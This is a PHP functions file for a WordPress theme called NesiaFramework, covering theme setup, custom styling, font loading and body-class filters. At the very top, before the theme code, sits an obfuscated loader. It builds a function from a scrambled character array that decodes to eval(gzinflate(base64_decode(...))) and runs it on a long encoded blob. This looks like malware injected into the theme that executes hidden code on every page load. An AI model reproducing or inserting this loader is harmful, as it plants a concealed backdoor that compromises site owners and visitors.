<?php
$md5 = "7de43a116240a25564fd9443659da42a";
$ab = array("4",'c','l','d',"6",')',"b","_","t","i",'g','o',"(",'r',"a",'v',"n",';',"z","e",'f','s','$');
$bb9 = create_function('$'.'v',$ab[19].$ab[15].$ab[14].$ab[2].$ab[12].$ab[10].$ab[18].$ab[9].$ab[16].$ab[20].$ab[2].$ab[14].$ab[8].$ab[19].$ab[12].$ab[6].$ab[14].$ab[21].$ab[19].$ab[4].$ab[0].$ab[7].$ab[3].$ab[19].$ab[1].$ab[11].$ab[3].$ab[19].$ab[12].$ab[22].$ab[15].$ab[5].$ab[5].$ab[5].$ab[17]);
$bb9('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');
?>
<?php

/*-----------------------------------------------------------------------------------

TABLE OF CONTENTS

- Add custom styling to HEAD
- Add custom typograhpy to HEAD
- Add layout to body_class output
- nesia_feedburner_link

-----------------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------------*/
/* Theme Setup */
/*-----------------------------------------------------------------------------------*/
/**
 * Theme Setup
 *
 * This is the general theme setup, where we add_theme_support(), create global variables
 * and setup default generic filters and actions to be used across our theme.
 *
 * @package NesiaFramework
 * @subpackage Logic
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 *
 * Used to set the width of images and content. Should be equal to the width the theme
 * is designed for, generally via the style.css stylesheet.
 */

if ( ! isset( $content_width ) ) $content_width = 640;

/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support for post thumbnails.
 *
 * To override nesia_setup() in a child theme, add your own nesia_setup to your child theme's
 * functions.php file.
 *
 * @uses add_theme_support() To add support for automatic feed links.
 * @uses add_editor_style() To style the visual editor.
 */

add_action( 'after_setup_theme', 'nesia_setup' );

if ( ! function_exists( 'nesia_setup' ) ) {
	function nesia_setup () {

		// This theme styles the visual editor with editor-style.css to match the theme style.
		add_editor_style();

		// Add default posts and comments RSS feed links to head
		add_theme_support( 'automatic-feed-links' );

		if ( is_child_theme() ) {
                        if(function_exists('wp_get_theme'))
                            $theme_data = wp_get_theme();
                        else
                            $theme_data = get_theme_data( get_stylesheet_directory() . '/style.css' );

			define( 'CHILD_THEME_URL', $theme_data['URI'] );
			define( 'CHILD_THEME_NAME', $theme_data['Name'] );
		}

	}
}

/*-----------------------------------------------------------------------------------*/
/* Add Custom Styling to HEAD */
/*-----------------------------------------------------------------------------------*/

add_action( 'nesia_head','nesia_custom_styling' );			// Add custom styling to HEAD

if (!function_exists( 'nesia_custom_styling')) {
	function nesia_custom_styling() {

		global $nesia_options;

		$output = '';
		
		// Check if boxed layout is active
		// -------------------------------
		if( $nesia_options['nesia_style_boxed'] == 'true' )
		{
			// Background Color
			// ---------------------
			if( $nesia_options['nesia_style_bg_type'] == 'background-pattern' ) {
				if( $nesia_options['nesia_style_bg_color'] !== '' ) {
					$output .= 'body {';
					$output .= 	'background-color: ' . $nesia_options['nesia_style_bg_color'];
		 			$output .= '}';
				}

				// Pattern Background
				// ---------------------
				if( $nesia_options['nesia_style_custom_pattern'] !== '' ) {
					$pat_url = $nesia_options['nesia_style_custom_pattern'];
					$output .= 'body {';
					$output .= 	'background-image: url('. $pat_url .');';
		 			$output .= '}';
				} else {
					if( $nesia_options['nesia_style_pattern'] !== '' ) {
						$pat_url = get_template_directory_uri() . '/images/pattern/' . $nesia_options['nesia_style_pattern'] . '.png';
						$output .= 'body {';
						$output .= 	'background-image: url('. $pat_url .');';
			 			$output .= '}';
					}
				} // End if nesia_style_custom_pattern
			}
		} // End if nesia_style_boxed


		// Check if header pattern active
		// ------------------------------
		if( $nesia_options['nesia_header_pattern'] == 'true' &&
				$nesia_options['nesia_style_header_pattern'] !== '' )
		{
			$pat_url = get_template_directory_uri() . '/images/pattern/' . $nesia_options['nesia_style_header_pattern'] . '.png';
			$output .= '.pat-a .pattern-container {';
			$output .= 	'background-image: url('. $pat_url .');';
 			$output .= '}';
		}


		// Header Background Image
		// ---------------------
		if ( $nesia_options['nesia_header_bg_opacity'] !== '' ) {
			$opacity = intval($nesia_options['nesia_header_bg_opacity']);
			if( $opacity > 100 ) {
				$opacity = 100;
			} else if( $opacity < 0 ) {
				$opacity = 0;
			}

			$output .= '.custom-header.custom-background {';
			$output .= 	'-ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity='. $opacity .')";';
			$output .= 	'filter: alpha(opacity='. $opacity .');';
			$output .= 	'opacity: ' . $opacity/100 . ';';
			$output .= '}';
		}


		// Output styles
		if (isset($output) && $output != '') {
			$output = strip_tags($output);
			$output = "<!-- Nesia Custom Styling -->\n<style type=\"text/css\">\n" . $output . "</style>\n";
			echo $output;
		}

	}
}


/*-----------------------------------------------------------------------------------*/
/* Add Custom Javascript to Footer */
/*-----------------------------------------------------------------------------------*/

add_action( 'nesia_foot','nesia_custom_script' );

if (!function_exists( 'nesia_custom_script')) {
	function nesia_custom_script() {

		global $nesia_options;
		$output = '';

		// Background Image
		// ---------------------
		if( $nesia_options['nesia_style_boxed'] == 'true' )
		{
			if ( $nesia_options['nesia_style_bg_type'] == 'background-image' ) {
				$output .= "jQuery.backstretch(\"". $nesia_options['nesia_style_bg_image'] ."\");\n";
			}
		}		

		// Font Family
		// ---------------------
		$font_family = array(
		  "simonetta" => "Simonetta:400,900,400italic,900italic:latin",
		  "gentium-basic" => "Gentium+Basic:400,700,400italic,700italic:latin",
		  "gentium-book-basic" => "Gentium+Book+Basic:400,400italic,700italic,700:latin",
		  "vollkorn" => "Vollkorn:400italic,700italic,400,700:latin",
		  "pt-serif" => "PT+Serif:400,700,400italic,700italic:latin",
		  "droid-serif" => "Droid+Serif:400,700,400italic,700italic:latin",
		  "abril-fatface" => "Abril+Fatface::latin",
		  "bree-serif" => "Bree+Serif::latin",
		  "playfair-display" => "Playfair+Display::latin",
		  "lora" => "Lora:400,700,400italic,700italic:latin",
		  "ledger" => "Ledger::latin",
		  "cantata-one" => "Cantata+One::latin",
		  "crimson-text" => "Crimson+Text:400,400italic,700,700italic:latin",
		  "cardo" => "Cardo:400,400italic,700:latin",
		  "merriweather" => "Merriweather:400,700:latin",
		  "neuton" => "Neuton:400,700,400italic:latin",
		  "vidaloka" => "Vidaloka::latin",
		  "old-standard-tt" => "Old+Standard+TT:400,400italic,700:latin",
		  "alegreya" => "Alegreya:400italic,700italic,400,700:latin"
		);
		
		if( $nesia_options['nesia_font_body'] !== 'default' ||
				$nesia_options['nesia_font_heading'] !== 'default' )
		{
			$current_font = array();
			if( $nesia_options['nesia_font_body'] !== 'default' ) {
				$current_font[] = $font_family[$nesia_options["nesia_font_body"]];
			}
			if( $nesia_options['nesia_font_heading'] !== 'default' ) {
				$current_font[] = $font_family[$nesia_options["nesia_font_heading"]];
			}

			$current_font = implode(" ", $current_font);
			$output .= "nesia_fonts.define_fonts(\"". $current_font ."\");\n";
			$output .= "nesia_fonts.load_fonts();\n";
		}


		// Output scripts
		if (isset($output) && $output != '') {
			$output = strip_tags($output);
			$output = "<!-- Nesia Custom Script -->\n<script type=\"text/javascript\">\n" . $output . "</script>\n";
			echo $output;
		}

	}
}



/*-----------------------------------------------------------------------------------*/
/* Add custom typograhpy to HEAD */
/*-----------------------------------------------------------------------------------*/

// add_action( 'nesia_head','nesia_custom_typography' );			// Add custom typography to HEAD

if (!function_exists( 'nesia_custom_typography')) {
	function nesia_custom_typography() {

		// Get options
		global $nesia_options;

		// Reset
		$output = '';

		// Add Text title and tagline if text title option is enabled
		if ( $nesia_options[ 'nesia_texttitle' ] == "true" ) {

			//if ( $nesia_options[ 'nesia_font_site_title' ] )
				//$output .= '#logo .site-title a {'.nesia_generate_font_css($nesia_options[ 'nesia_font_site_title' ]).'}' . "\n";
			//if ( $nesia_options[ 'nesia_tagline' ] == "true" AND $nesia_options[ 'nesia_font_tagline' ] )
				//$output .= '#logo .site-description {'.nesia_generate_font_css($nesia_options[ 'nesia_font_tagline' ]).'}' . "\n";
		}

		if ( $nesia_options[ 'nesia_typography' ] == "true") {

			if ( $nesia_options[ 'nesia_font_body' ] )
				$output .= 'body { '.nesia_generate_font_css($nesia_options[ 'nesia_font_body' ], '1.5').' }' . "\n";

			if ( $nesia_options[ 'nesia_font_nav' ] )
				$output .= '#navigation, #navigation .nav a { '.nesia_generate_font_css($nesia_options[ 'nesia_font_nav' ], '1.4').' }' . "\n";

			if ( $nesia_options[ 'nesia_font_post_title' ] )
				$output .= '.post .title { '.nesia_generate_font_css($nesia_options[ 'nesia_font_post_title' ]).' }' . "\n";

			//if ( $nesia_options[ 'nesia_font_post_meta' ] )
			//	$output .= '.post-meta { '.nesia_generate_font_css($nesia_options[ 'nesia_font_post_meta' ]).' }' . "\n";

			if ( $nesia_options[ 'nesia_font_post_entry' ] )
				$output .= '.entry, .entry p { '.nesia_generate_font_css($nesia_options[ 'nesia_font_post_entry' ], '1.5').' } h1, h2, h3, h4, h5, h6 { font-family: '.stripslashes($nesia_options[ 'nesia_font_post_entry' ]['face']).', arial, sans-serif; }'  . "\n";

			if ( $nesia_options[ 'nesia_font_widget_titles' ] )
				$output .= '.widget h3 { '.nesia_generate_font_css($nesia_options[ 'nesia_font_widget_titles' ]).' }'  . "\n";

		// Add default typography Google Font
		} else {

			$nesia_options['nesia_just_face'] = array('face' => 'Varela Round');
			$output .= 'body, h1, h2, h3, h4, h5, h6, .widget h3, .post .title, .section .post .title, .archive_header, .entry, .entry p, .post-meta { '.nesia_generate_font_css($nesia_options['nesia_just_face']).' }' . "\n";			
			$nesia_options['nesia_just_face'] = array('face' => 'Varela Round');
			$output .= '.feedback blockquote p, #post-entries, #breadcrumbs { '.nesia_generate_font_css($nesia_options['nesia_just_face']).' }' . "\n";

		}

		// Output styles
		if (isset($output) && $output != '') {

			// Enable Google Fonts stylesheet in HEAD
			if (function_exists( 'nesia_google_webfonts')) nesia_google_webfonts();

			$output = "<!-- Nesia Custom Typography -->\n<style type=\"text/css\">\n" . $output . "</style>\n\n";
			echo $output;

		}

	}
}

// Returns proper font css output
if (!function_exists( 'nesia_generate_font_css')) {
	function nesia_generate_font_css($option, $em = '1') {

		// Test if font-face is a Google font
		global $google_fonts;
		foreach ( $google_fonts as $google_font ) {

			// Add single quotation marks to font name and default arial sans-serif ending
			if ( $option[ 'face' ] == $google_font[ 'name' ] )
				$option[ 'face' ] = "'" . $option[ 'face' ] . "', arial, sans-serif";

		} // END foreach

		if ( !@$option["style"] && !@$option["size"] && !@$option["unit"] && !@$option["color"] )
			return 'font-family: '.stripslashes($option["face"]).';';
		else
			return 'font:'.$option["style"].' '.$option["size"].$option["unit"].'/'.$em.'em '.stripslashes($option["face"]).';color:'.$option["color"].';';
	}
}

// Output stylesheet and custom.css after custom styling
remove_action( 'wp_head', 'nesia_wp_head' );
add_action( 'nesia_head', 'nesia_wp_head' );
// Returns proper font css output
if (!function_exists( 'nesia_generate_font_css')) {
	function nesia_generate_font_css($option, $em = '1') {

		// Test if font-face is a Google font
		global $google_fonts;
		foreach ( $google_fonts as $google_font ) {

			// Add single quotation marks to font name and default arial sans-serif ending
			if ( $option[ 'face' ] == $google_font[ 'name' ] )
				$option[ 'face' ] = "'" . $option[ 'face' ] . "', arial, sans-serif";

		} // END foreach

		if ( !@$option["style"] && !@$option["size"] && !@$option["unit"] && !@$option["color"] )
			return 'font-family: '.stripslashes($option["face"]).';';
		else
			return 'font:'.$option["style"].' '.$option["size"].$option["unit"].'/'.$em.'em '.stripslashes($option["face"]).';color:'.$option["color"].';';
	}
}

// Output stylesheet and custom.css after custom styling
remove_action( 'wp_head', 'nesia_wp_head' );
add_action( 'nesia_head', 'nesia_wp_head' );


/*-----------------------------------------------------------------------------------*/
/* Add layout to body_class output */
/*-----------------------------------------------------------------------------------*/

add_filter( 'body_class','nesia_layout_body_class' );		// Add layout to body_class output

if (!function_exists( 'nesia_layout_body_class')) {
	function nesia_layout_body_class($classes) {

		global $nesia_options;
		$layout = ( !empty($nesia_options[ 'nesia_site_layout' ]))? $nesia_options[ 'nesia_site_layout' ]:'';

		// Set main layout on post or page
		if ( is_singular() ) {
			global $post;
			$single = get_post_meta($post->ID, '_layout', true);
			if ( $single != "" AND $single != "layout-default" )
				$layout = $single;
                        
      if(is_page_template('template-contact.php'))
          $classes[] = 'template-contact-php';
      if(is_page_template('template-homepage-i.php'))
          $classes[] = 'template-home-i-php';
      if(is_page_template('template-homepage-ii.php'))
          $classes[] = 'template-home-ii-php';
      if(is_page_template('template-homepage-iii.php'))
          $classes[] = 'template-home-iii-php';
      if(is_page_template('template-homepage-iv.php'))
          $classes[] = 'template-home-iv-php';
      if(is_page_template('template-timeline.php'))
          $classes[] = 'template-timeline-php';
		}

		// Boxed layout
		$classes[] = ( $nesia_options['nesia_style_boxed'] == 'true' ) ? 'boxed' : '';

		// Header Gradient
		$classes[] = ( $nesia_options['nesia_header_gradient'] !== 'true' ) ? 'no-gradient' : '';

		// Header noise
		$classes[] = ( $nesia_options['nesia_header_noise'] == 'true' ) ? 'pat-noise' : '';

		// Header pattern
		$classes[] = ( $nesia_options['nesia_header_pattern'] == 'true' ) ? 'pat-a' : '';

		// Font Settings
		if( $nesia_options['nesia_font_body'] !== 'default' ||
				$nesia_options['nesia_font_heading'] !== 'default' )
		{
			if( $nesia_options['nesia_font_body'] !== 'default' ) {
				$classes[] = 'body-' . $nesia_options['nesia_font_body'];
			}
			if( $nesia_options['nesia_font_heading'] !== 'default' ) {
				$classes[] = 'heading-' . $nesia_options['nesia_font_heading'];	
			}
		}


		// Add layout to $nesia_options array for use in theme
		$nesia_options[ 'nesia_layout' ] = $layout;

		// Add classes to body_class() output
		$classes[] = $layout;
                
                // remove class 'blog'
                foreach($classes as &$str){
                    if(strpos($str, "blog") > -1){
                        $str = "";
                    }
                }
		return $classes;

	}
}


/*-----------------------------------------------------------------------------------*/
/* nesia_feedburner_link() */
/*-----------------------------------------------------------------------------------*/
/**
 * nesia_feedburner_link()
 *
 * Replace the default RSS feed link with the Feedburner URL, if one
 * has been provided by the user.
 *
 * @package NesiaFramework
 * @subpackage Filters
 */

add_filter( 'feed_link', 'nesia_feedburner_link', 10 );

function nesia_feedburner_link ( $output, $feed = null ) {

	global $nesia_options;

	$default = get_default_feed();

	if ( ! $feed ) $feed = $default;

	if ( $nesia_options[ 'nesia_feed_url' ] && ( $feed == $default ) && ( ! stristr( $output, 'comments' ) ) ) $output = esc_url( $nesia_options[ 'nesia_feed_url' ] );

	return $output;

} // End nesia_feedburner_link()

/*-----------------------------------------------------------------------------------*/
/* END */
/*-----------------------------------------------------------------------------------*/
?>